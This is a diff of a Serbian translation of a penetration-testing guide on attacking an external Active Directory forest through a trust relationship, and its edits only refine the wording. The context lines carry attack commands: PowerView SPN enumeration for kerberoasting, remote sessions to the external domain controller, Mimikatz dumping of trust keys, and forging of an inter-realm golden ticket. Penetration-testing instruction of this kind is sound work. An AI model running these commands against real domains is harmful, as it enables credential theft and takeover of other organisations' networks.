@@ -1,4 +1,4 @@
-# Eksterni šumski domen - Jednosmerni (ulazni) ili bidirekcioni
+# Eksterni šumski domen - Jednosmerni (ulazni) ili dvosmerni
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -58,11 +58,11 @@ IsDomain     : True
 ```
 U prethodnoj enumeraciji je otkriveno da je korisnik **`crossuser`** unutar grupe **`External Admins`** koja ima **Admin pristup** unutar **DC-a spoljnog domena**.
 
-## Početni Pristup
+## Početni pristup
 
-Ako **niste mogli** da pronađete bilo kakav **poseban** pristup vašeg korisnika u drugom domenu, još uvek možete da se vratite na AD metodologiju i pokušate da **privesc od korisnika bez privilegija** (stvari poput kerberoasting-a na primer):
+Ako **niste mogli** da pronađete bilo kakav **poseban** pristup vašeg korisnika u drugom domenu, još uvek možete da se vratite na AD metodologiju i pokušate da **privesc-ujete iz nepovlašćenog korisnika** (stvari poput kerberoasting-a na primer):
 
-Možete koristiti **Powerview funkcije** da **enumerate** **drugi domen** koristeći `-Domain` parametar kao u:
+Možete koristiti **Powerview funkcije** da **enumerate** drugi **domen** koristeći `-Domain` parametar kao u:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -74,7 +74,7 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ### Prijavljivanje
 
-Korišćenjem uobičajenog metoda sa akreditivima korisnika koji ima pristup spoljnjem domenu, trebali biste moći da pristupite:
+Koristeći uobičajenu metodu sa kredencijalima korisnika koji ima pristup spoljašnjem domenu, trebali biste moći da pristupite:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
@@ -91,7 +91,7 @@ Ako je korisnik **migriran iz jedne šume u drugu** i **SID filtriranje nije omo
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Možete **potpisati sa** **povjerenim** ključem **TGT koji imitira** korisnika trenutnog domena.
+Možete **potpisati sa** **povjerenim** ključem **TGT** koji imitira korisnika trenutnog domena.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
